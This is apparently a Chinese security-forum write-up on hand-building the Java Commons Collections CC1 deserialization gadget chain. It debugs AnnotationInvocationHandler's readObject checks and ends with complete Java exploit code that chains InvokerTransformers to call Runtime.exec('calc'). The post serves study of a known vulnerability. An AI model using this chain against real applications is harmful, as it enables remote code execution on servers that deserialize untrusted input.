
# 问题3、AnnotationInvocationHandler类中的readObject()中的for循环中有两个if判断需要满足。

# 问题3解决

## 分析

1、可能没进入if判断

2、后面的`setValue()`括号中的

`new AnnotationTypeMismatchExceptionProxy()`是我们不能控制的。

### 第一个`if`:

调试：下断点运行，发现`Override.class`中是空的，`getKey()`得到的是`null`，进不去第一个`if`判断。

| | |

| --- | --- |

| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17 | `public @interface Override {`  `}`  `for` `(``Map``.Entry<String,` `Object``> memberValue : memberValues.entrySet()) {`  `String name` `=` `memberValue.getKey();`  `/``/` `因为Override里面是空实现，所以memberType为null`  `Class<?> memberType` `=` `memberTypes.get(name);`  `if` `(memberType !``=` `null) {` `/``/` `i.e. member still exists`  `Object` `value` `=` `memberValue.getValue();`  `if` `(!(memberType.``isInstance``(value) ||`  `value instanceof ExceptionProxy)) {`  `memberValue.setValue(`  `new AnnotationTypeMismatchExceptionProxy(`  `value.getClass()` `+` `"["` `+` `value` `+` `"]"``).setMember(`  `annotationType.members().get(name)));`  `}`  `}`  `}` |

把

| | |

| --- | --- |

| 1 | `Object` `o` `=` `annotationInvocationHandlerConstructor.newInstance(Override.``class``, transforedMap);` |

改成

| | |

| --- | --- |

| 1 | `Object` `o` `=` `annotationInvocationHandlerConstructor.newInstance(Target.``class``, transforedMap);` |

注解`Target`中是有参数的。

| | |

| --- | --- |

| 1  2  3  4  5  6  7  8  9 | `public @interface Target {`  `/``*``*`  `*` `Returns an array of the kinds of elements an annotation` `type`  `*` `can be applied to.`  `*` `@``return` `an array of the kinds of elements an annotation` `type`  `*` `can be applied to`  `*``/`  `ElementType[] value();`  `}` |

### 第二个`if`（直接可以进入，不需要构造）：

1、`memberType`能不能强转成`value`

2、`value`是不是`ExceptionProxy`类的实例

| | |

| --- | --- |

| 1 | `if` `(!(memberType.``isInstance``(value) || value instanceof ExceptionProxy))` |

# 问题1解决

使用`ConstantTransformer()`。

`ConstantTransformer`：不管输入是什么，调用`transform()`方法时，都返回构造函数输入的值。

# payload3

| | |

| --- | --- |

| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20  21  22  23  24  25  26  27  28  29  30  31  32  33  34 | `/``/` `此处的Runtime 对象 r 是不能序列化的，需要修改`  `/``/` `Runtime r` `=` `Runtime.getRuntime();`  `/``/` `InvokerTransformer invokerTransformer` `=` `new InvokerTransformer(``"exec"``, new Class[]{String.``class``}, new` `Object``[]{``"calc"``});`  `Transformer[] transformers` `=` `new Transformer[]{`  `new ConstantTransformer(Runtime.``class``),`  `new InvokerTransformer(``"getMethod"``, new Class[]{String.``class``, Class[].``class``},`  `new` `Object``[]{``"getRuntime"``, null}),`  `new InvokerTransformer(``"invoke"``, new Class[]{``Object``.``class``,` `Object``[].``class``},`  `new` `Object``[]{null, null}),`  `new InvokerTransformer(``"exec"``, new Class[]{String.``class``},`  `new` `Object``[]{``"calc"``})`  `};`  `ChainedTransformer chainedTransformer` `=` `new ChainedTransformer(transformers);`    `HashMap<``Object``,` `Object``>` `map` `=` `new HashMap<>();`  `/``/` `第一个值要与所选注解中的参数对应，Target中的参数为value，所以第一个参数要改为value`  `map``.put(``"value"``,``"value"``);`  `Map``<``Object``,` `Object``> transforedMap` `=` `TransformedMap.decorate(``map``, null, chainedTransformer);`  `/``*`  `for``(``Map``.Entry entry : transforedMap.entrySet()){`  `entry.setValue(r);`  `}`  `*``/`  `/``/` `获取类`  `Class<?> c` `=` `Class.forName(``"sun.reflect.annotation.AnnotationInvocationHandler"``);`  `/``/` `获取构造函数`  `Constructor<?> annotationInvocationHandlerConstructor` `=` `c.getDeclaredConstructor(Class.``class``,` `Map``.``class``);`  `/``/` `爆破`  `annotationInvocationHandlerConstructor.setAccessible(true);`  `/``/` `获取实例`  `Object` `o` `=` `annotationInvocationHandlerConstructor.newInstance(Target.``class``, transforedMap);`    `serialize(o);` `/``/` `序列化`  `deserialize(``"ser.bin"``);` `/``/` `反序列化` |

# 正向调用顺序

![图片描述](https://bbs.kanxue.com/upload/attach/202212/951339_6GGKXDYMZTR5933.png)

## 参考文献

[Java 反序列化漏洞（二） - Commons Collections](https://bbs.kanxue.com/elink@7f9K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6N6e0p5^5i4K6u0W2L8%4u0Y4i4K6u0r3M7r3!0K6N6q4)9J5c8Y4W2K6L8%4y4W2M7X3W2S2L8q4)9J5k6s2y4#2x3e0S2Q4x3X3b7J5i4K6u0r3)

[Java反序列化CommonsCollections篇(一) CC1链手写EXP](https://bbs.kanxue.com/elink@c9bK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2T1K9h3I4A6j5X3W2D9K9g2)9J5k6h3y4G2L8g2)9J5c8Y4k6A6k6r3g2G2i4K6u0r3b7W2j5I4L8X3)9@1P5e0q4g2y4@1f1I4i4K6u0r3i4K6y4r3M7%4m8E0i4K6g2X3K9h3c8Q4y4h3k6X3M7X3!0E0i4K6y4p5x3K6x3K6i4K6u0W2z5o6R3H3i4K6u0W2L8i4W2Q4y4h3k6Z5K9i4y4@1L8%4u0&6i4K6u0W2M7r3q4Y4k6g2)9J5k6h3y4D9K9h3y4C8i4K6t1$3j5h3#2H3i4K6y4n7N6X3c8Q4y4h3k6K6L8%4g2J5j5$3g2Q4x3@1b7K6j5U0q4V1x3e0c8W2j5U0u0X3y4r3q4V1x3U0x3&6k6e0t1#2k6U0p5@1j5U0M7K6y4X3c8V1z5h3g2W2y4l9`.`.)

[Java ysoserial学习之CommonsCollections篇(一) CC1链手写EXP]

[Java ysoserial学习之CommonsCollections篇(一) CC1链手写EXP](https://bbs.kanxue.com/elink@778K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6E0M7q4)9J5k6i4N6W2K9i4S2A6L8W2)9J5k6i4q4I4i4K6u0W2j5$3!0E0i4K6u0r3M7#2)9K6c8W2)9#2k6W2)9#2k6X3u0A6P5W2)9K6c8p5#2*7K9%4A6a6c8p5W2%4e0g2c8u0N6@1&6Y4i4K6y4p5i4K6y4p5i4K6t1$3j5h3#2H3i4K6y4n7L8h3W2V1i4K6y4p5x3U0t1@1y4K6b7^5y4o6f1I4y4q4)9J5y4X3q4E0M7q4)9K6b7X3W2V1P5q4)9K6c8o6q4Q4x3U0k6S2L8i4m8Q4x3@1u0K6L8W2)9K6c8o6t1#2y4e0u0W2j5K6x3J5y4r3x3I4x3K6V1#2j5K6W2U0x3$3x3^5j5U0W2X3y4K6S2U0j5X3t1@1z5e0l9^5i4K6t1$3j5h3#2H3i4K6y4n7j5$3S2C8M7$3#2Q4x3@1c8U0x3U0R3J5z5h3b7%4j5X3j5#2k6U0f1I4y4o6k6V1x3h3b7J5k6r3b7H3y4e0x3I4x3K6b7@1x3U0j5J5j5e0x3I4j5U0b7@1k6U0t1%4k6o6S2U0y4e0k6U0y4K6b7$3y4h3p5&6k6o6l9#2y4e0g2U0z5o6M7%4x3$3u0U0x3o6V1$3y4o6t1@1j5e0m8V1k6o6f1K6i4K6t1$3j5h3#2H3i4K6y4n7M7$3y4W2L8X3g2Q4x3@1b7I4y4K6S2Q4x3U0k6S2L8i4m8Q4x3@1u0U0N6i4u0Q4y4h3k6S2L8r3u0#2L8g2)9#2k6X3W2V1i4K6y4p5x3e0R3&6z5o6M7%4z5o6b7%4x3e0V1H3y4o6V1#2x3U0x3J5y4g2)9J5x3%4u0V1)

[Commons Collections Java反序列化漏洞深入分析](https://bbs.kanxue.com/elink@33dK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6k6h3y4#2M7X3W2@1P5g2)9J5k6i4c8W2L8X3y4W2L8Y4c8Q4x3X3g2U0L8$3#2Q4x3V1k6A6L8X3c8W2P5q4)9J5k6i4m8Z5M7q4)9J5c8X3u0D9L8$3N6Q4x3V1k6E0M7$3N6Q4x3V1j5&6y4H3`.`.)

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

最后于  2022-12-1 21:33

被wx\_牛牛\_292编辑

，原因：
